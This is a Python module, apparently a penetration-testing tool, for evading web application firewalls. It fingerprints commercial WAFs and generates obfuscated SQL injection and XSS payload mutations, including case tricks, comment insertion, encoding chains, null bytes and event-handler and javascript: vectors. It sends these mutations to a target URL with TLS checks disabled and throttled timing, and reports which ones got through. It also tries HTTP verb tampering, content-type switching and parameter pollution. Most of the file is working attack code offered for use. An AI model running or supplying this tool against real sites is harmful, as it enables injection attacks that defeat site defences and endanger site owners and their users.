"""
WAF Bypass Module - Advanced Web Application Firewall Evasion
Context7 reviewed: Uses requests best practices for session management and headers
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util import Retry
import base64
import urllib.parse
import random
import string
import time
import re
from typing import Dict, List, Optional, Tuple
import logging

logger = logging.getLogger(__name__)


class WAFBypass:
    """
    Advanced WAF bypass techniques for penetration testing
    
    Features:
    - WAF detection and fingerprinting
    - Multiple encoding techniques
    - Payload mutation and obfuscation
    - Rate limit evasion
    - Cloudflare-specific bypasses
    """
    
    def __init__(self):
        # Context7 pattern: Session with retry strategy
        self.session = requests.Session()
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.3,
            status_forcelist=[502, 503, 504],
            allowed_methods={'GET', 'POST'}
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Context7 pattern: Browser-like headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        })
        
        # WAF signatures for detection
        self.waf_signatures = {
            'Cloudflare': [
                'cloudflare',
                'cf-ray',
                '__cfduid',
                'cf_clearance',
                'cloudflare-nginx'
            ],
            'Imperva': [
                'incapsula',
                'incap_ses',
                'visid_incap',
                '_incap_',
                'x-cdn: Incapsula'
            ],
            'Akamai': [
                'akamai',
                'akamaighost',
                'x-akamai'
            ],
            'ModSecurity': [
                'mod_security',
                'modsecurity',
                'NOYB'
            ],
            'AWS WAF': [
                'x-amzn-requestid',
                'x-amzn-errortype',
                'x-amz-'
            ],
            'Sucuri': [
                'sucuri',
                'x-sucuri-id',
                'x-sucuri-cache'
            ],
            'Wordfence': [
                'wordfence',
                'wfvt_'
            ],
            'F5 BIG-IP': [
                'bigipserver',
                'x-wa-info',
                'f5-'
            ],
            'Barracuda': [
                'barracuda',
                'barra_counter_session'
            ],
            'Fortinet': [
                'fortigate',
                'fortiweb'
            ]
        }
        
        # Rate limiting settings
        self.request_delay = 0.5  # seconds between requests
        self.last_request_time = 0
    
    def detect_waf(self, url: str) -> Dict:
        """
        Detect WAF presence and type
        Context7 pattern: Proper error handling and response inspection
        """
        detected_wafs = []
        detection_methods = []
        
        try:
            # Method 1: Normal request analysis
            response = self.session.get(url, timeout=(5, 10), verify=False)
            
            # Check headers for WAF signatures
            headers_str = str(response.headers).lower()
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if signature.lower() in headers_str:
                        detected_wafs.append(waf_name)
                        detection_methods.append(f"Header signature: {signature}")
                        break
            
            # Check response content for WAF indicators
            content_str = response.text.lower()
            for waf_name, signatures in self.waf_signatures.items():
                for signature in signatures:
                    if signature.lower() in content_str:
                        if waf_name not in detected_wafs:
                            detected_wafs.append(waf_name)
                            detection_methods.append(f"Content signature: {signature}")
                        break
            
            # Method 2: Malicious payload test (triggers WAF response)
            test_payload = "' OR 1=1--"
            test_url = f"{url}?test={urllib.parse.quote(test_payload)}"
            
            try:
                malicious_response = self.session.get(test_url, timeout=(5, 10), verify=False)
                
                # Common WAF blocking status codes
                if malicious_response.status_code in [403, 406, 419, 429, 503]:
                    detection_methods.append(f"WAF blocking (Status: {malicious_response.status_code})")
                    
                    # Check blocking page for WAF indicators
                    block_content = malicious_response.text.lower()
                    for waf_name, signatures in self.waf_signatures.items():
                        for signature in signatures:
                            if signature.lower() in block_content:
                                if waf_name not in detected_wafs:
                                    detected_wafs.append(waf_name)
                                    detection_methods.append(f"Blocking page: {waf_name}")
                                break
                
            except requests.exceptions.ConnectionError:
                detection_methods.append("Connection reset by WAF/IPS")
                
        except Exception as e:
            logger.error(f"WAF detection error: {str(e)}")
        
        return {
            'waf_detected': len(detected_wafs) > 0,
            'waf_types': list(set(detected_wafs)),
            'detection_methods': detection_methods,
            'recommendation': self._get_bypass_recommendation(detected_wafs)
        }
    
    def _get_bypass_recommendation(self, detected_wafs: List[str]) -> str:
        """Provide WAF-specific bypass recommendations"""
        if not detected_wafs:
            return "No WAF detected - standard payloads should work"
        
        recommendations = []
        
        if 'Cloudflare' in detected_wafs:
            recommendations.append("Cloudflare: Try origin IP discovery, encoding variations, rate limiting")
        if 'ModSecurity' in detected_wafs:
            recommendations.append("ModSecurity: Use comment injection, case variation, whitespace manipulation")
        if 'Imperva' in detected_wafs:
            recommendations.append("Imperva: Try HTTP verb tampering, content-type tricks, encoding chains")
        if 'AWS WAF' in detected_wafs:
            recommendations.append("AWS WAF: Use parameter pollution, encoding, header manipulation")
        
        if not recommendations:
            recommendations.append("Generic WAF: Try all bypass techniques")
        
        return " | ".join(recommendations)
    
    def encode_payload(self, payload: str, technique: str = 'url') -> str:
        """
        Encode payload using various techniques
        
        Techniques:
        - url: URL encoding
        - double_url: Double URL encoding
        - unicode: Unicode encoding
        - hex: Hexadecimal encoding
        - base64: Base64 encoding
        - html: HTML entity encoding
        """
        if technique == 'url':
            return urllib.parse.quote(payload)
        
        elif technique == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        
        elif technique == 'unicode':
            return ''.join([f'\\u{ord(c):04x}' for c in payload])
        
        elif technique == 'hex':
            return ''.join([f'\\x{ord(c):02x}' for c in payload])
        
        elif technique == 'base64':
            return base64.b64encode(payload.encode()).decode()
        
        elif technique == 'html':
            return ''.join([f'&#{ord(c)};' for c in payload])
        
        else:
            return payload
    
    def mutate_sql_payload(self, payload: str, level: int = 1) -> List[str]:
        """
        Generate SQL injection payload mutations
        
        Levels:
        1: Basic (case, comments)
        2: Medium (encoding, whitespace)
        3: Advanced (all techniques)
        """
        mutations = [payload]  # Original
        
        if level >= 1:
            # Case variation: UnIoN SeLeCt
            case_varied = ''.join([c.upper() if random.choice([True, False]) else c.lower() 
                                   for c in payload])
            mutations.append(case_varied)
            
            # Comment injection: UN/**/ION SE/**/LECT
            comment_injected = payload.replace(' ', '/**/')
            mutations.append(comment_injected)
            
            # Inline comments: UN/*comment*/ION
            words = payload.split()
            if len(words) > 1:
                inline_comment = words[0] + '/*bypass*/' + '/**/'.join(words[1:])
                mutations.append(inline_comment)
        
        if level >= 2:
            # URL encoding
            mutations.append(urllib.parse.quote(payload))
            
            # Double URL encoding
            mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
            
            # Whitespace variations
            mutations.append(payload.replace(' ', '%09'))  # Tab
            mutations.append(payload.replace(' ', '%0a'))  # Newline
            mutations.append(payload.replace(' ', '%0d'))  # Carriage return
            mutations.append(payload.replace(' ', '+'))    # Plus
        
        if level >= 3:
            # Mixed case with encoding
            mixed = self.mutate_sql_payload(payload, level=1)[1]
            mutations.append(urllib.parse.quote(mixed))
            
            # Comment + encoding
            commented = self.mutate_sql_payload(payload, level=1)[2]
            mutations.append(urllib.parse.quote(commented))
            
            # Buffer overflow attempt
            mutations.append(payload + 'A' * 1000)
            
            # NULL byte injection
            mutations.append(payload + '%00')
            
            # Hex encoding
            hex_encoded = ''.join([f'\\x{ord(c):02x}' for c in payload])
            mutations.append(hex_encoded)
        
        return mutations
    
    def mutate_xss_payload(self, payload: str, level: int = 1) -> List[str]:
        """
        Generate XSS payload mutations
        """
        mutations = [payload]
        
        if level >= 1:
            # Case variation
            mutations.append(payload.replace('<script>', '<ScRiPt>'))
            mutations.append(payload.replace('<script>', '<sCrIpT>'))
            
            # Comment tricks
            mutations.append(payload.replace('<script>', '<script/**/>'))  # Fixed: added closing paren
            mutations.append(payload.replace('alert', 'al/**/ert'))
        
        if level >= 2:
            # HTML encoding
            mutations.append(payload.replace('<', '&lt;').replace('>', '&gt;'))
            mutations.append(payload.replace('<', '&#60;').replace('>', '&#62;'))
            mutations.append(payload.replace('<', '&#x3c;').replace('>', '&#x3e;'))
            
            # URL encoding
            mutations.append(urllib.parse.quote(payload))
            
            # Event handlers (bypass <script> filtering)
            mutations.append('<img src=x onerror=alert(1)>')
            mutations.append('<svg onload=alert(1)>')
            mutations.append('<body onload=alert(1)>')
        
        if level >= 3:
            # Unicode encoding
            mutations.append('<\\u0073cript>alert(1)</script>')
            
            # NULL byte
            mutations.append('<script%00>alert(1)</script>')
            
            # Data URI
            mutations.append('<iframe src="data:text/html,<script>alert(1)</script>">')
            
            # JavaScript protocol
            mutations.append('<a href="javascript:alert(1)">click</a>')
            
            # Mixed encoding
            mutations.append('%3c%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e')
        
        return mutations
    
    def http_verb_tampering(self, url: str, data: Dict = None) -> List[Dict]:
        """
        Try different HTTP methods to bypass WAF
        """
        results = []
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        
        for method in methods:
            try:
                self._rate_limit()
                
                if method in ['GET', 'HEAD', 'OPTIONS', 'DELETE']:
                    response = self.session.request(method, url, timeout=(5, 10), verify=False)
                else:
                    response = self.session.request(method, url, data=data, timeout=(5, 10), verify=False)
                
                results.append({
                    'method': method,
                    'status_code': response.status_code,
                    'success': response.status_code not in [403, 406, 419, 429, 503],
                    'response_length': len(response.content)
                })
                
            except Exception as e:
                results.append({
                    'method': method,
                    'status_code': 0,
                    'success': False,
                    'error': str(e)
                })
        
        return results
    
    def content_type_bypass(self, url: str, payload: str) -> List[Dict]:
        """
        Try different Content-Type headers to bypass WAF
        """
        results = []
        content_types = [
            'application/x-www-form-urlencoded',
            'application/json',
            'application/xml',
            'text/plain',
            'text/xml',
            'multipart/form-data',
            'application/soap+xml'
        ]
        
        for ct in content_types:
            try:
                self._rate_limit()
                
                headers = self.session.headers.copy()
                headers['Content-Type'] = ct
                
                # Format data based on content type
                if 'json' in ct:
                    data = f'{{"payload": "{payload}"}}'
                elif 'xml' in ct:
                    data = f'<?xml version="1.0"?><root>{payload}</root>'
                else:
                    data = payload
                
                response = self.session.post(url, data=data, headers=headers, 
                                            timeout=(5, 10), verify=False)
                
                results.append({
                    'content_type': ct,
                    'status_code': response.status_code,
                    'success': response.status_code not in [403, 406, 419, 429, 503],
                    'response_length': len(response.content)
                })
                
            except Exception as e:
                results.append({
                    'content_type': ct,
                    'status_code': 0,
                    'success': False,
                    'error': str(e)
                })
        
        return results
    
    def parameter_pollution(self, url: str, param: str, payload: str) -> str:
        """
        HTTP Parameter Pollution - send same parameter multiple times
        """
        # HPP technique: param=value1&param=value2&param=value3
        pollution_url = f"{url}?{param}=safe&{param}={payload}&{param}=safe"
        return pollution_url
    
    def discover_cloudflare_origin(self, domain: str) -> Dict:
        """
        Attempt to discover Cloudflare origin IP
        
        Methods:
        1. DNS history lookup
        2. Subdomain enumeration
        3. SSL certificate inspection
        4. MX record analysis
        """
        results = {
            'domain': domain,
            'origin_ips': [],
            'methods_used': []
        }
        
        # Note: These are placeholders for actual implementation
        # Real implementation would use:
        # - SecurityTrails API for DNS history
        # - Certificate Transparency logs
        # - Subdomain scanning
        # - WHOIS data
        
        results['methods_used'].append('Manual techniques required:')
        results['methods_used'].append('1. Check DNS history at SecurityTrails')
        results['methods_used'].append('2. Scan subdomains for non-Cloudflare IPs')
        results['methods_used'].append('3. Check SSL certificates for origin')
        results['methods_used'].append('4. Analyze MX/SPF records')
        
        return results
    
    def _rate_limit(self):
        """
        Implement rate limiting to avoid triggering WAF
        Context7 pattern: Simple delay management
        """
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        
        if elapsed < self.request_delay:
            time.sleep(self.request_delay - elapsed)
        
        self.last_request_time = time.time()
    
    def test_all_bypasses(self, url: str, payload: str, payload_type: str = 'sql') -> Dict:
        """
        Test all bypass techniques on a target
        
        Returns comprehensive report of what works
        """
        logger.info(f"Testing WAF bypasses on {url}")
        
        report = {
            'target': url,
            'original_payload': payload,
            'waf_detection': self.detect_waf(url),
            'successful_bypasses': [],
            'failed_bypasses': [],
            'recommendations': []
        }
        
        # Generate mutations
        if payload_type == 'sql':
            mutations = self.mutate_sql_payload(payload, level=3)
        elif payload_type == 'xss':
            mutations = self.mutate_xss_payload(payload, level=3)
        else:
            mutations = [payload]
        
        # Test each mutation
        for i, mutated in enumerate(mutations[:10]):  # Limit to 10 tests
            try:
                self._rate_limit()
                test_url = f"{url}?test={urllib.parse.quote(mutated)}"
                response = self.session.get(test_url, timeout=(5, 10), verify=False)
                
                # Success if not blocked
                if response.status_code not in [403, 406, 419, 429, 503]:
                    report['successful_bypasses'].append({
                        'mutation': mutated[:100],
                        'technique': f'Mutation {i+1}',
                        'status_code': response.status_code
                    })
                else:
                    report['failed_bypasses'].append({
                        'mutation': mutated[:100],
                        'status_code': response.status_code
                    })
                    
            except requests.exceptions.ConnectionError:
                report['failed_bypasses'].append({
                    'mutation': mutated[:100],
                    'error': 'Connection reset (WAF/IPS blocking)'
                })
            except Exception as e:
                logger.error(f"Bypass test error: {str(e)}")
        
        # Generate recommendations
        if report['successful_bypasses']:
            report['recommendations'].append(
                f"Found {len(report['successful_bypasses'])} working bypass(es)!"
            )
        else:
            report['recommendations'].append(
                "All bypasses blocked - WAF is well-configured"
            )
            report['recommendations'].append(
                "Try: Manual testing, authenticated access, or different attack vectors"
            )
        
        return report


if __name__ == "__main__":
    # Test WAF bypass capabilities
    print("🛡️ Testing WAF Bypass Module")
    print("=" * 70)
    
    waf = WAFBypass()
    
    # Test WAF detection
    test_url = "https://example.com"
    print(f"\n🔍 Testing WAF detection on {test_url}...")
    detection = waf.detect_waf(test_url)
    print(f"WAF Detected: {detection['waf_detected']}")
    if detection['waf_types']:
        print(f"WAF Types: {', '.join(detection['waf_types'])}")
    print(f"Recommendation: {detection['recommendation']}")
    
    # Test payload mutations
    print(f"\n💉 Testing SQL payload mutations...")
    sql_payload = "' OR 1=1--"
    mutations = waf.mutate_sql_payload(sql_payload, level=2)
    print(f"Generated {len(mutations)} mutations:")
    for i, mut in enumerate(mutations[:5], 1):
        print(f"  {i}. {mut}")
    
    print("\n✅ WAF Bypass Module ready!")
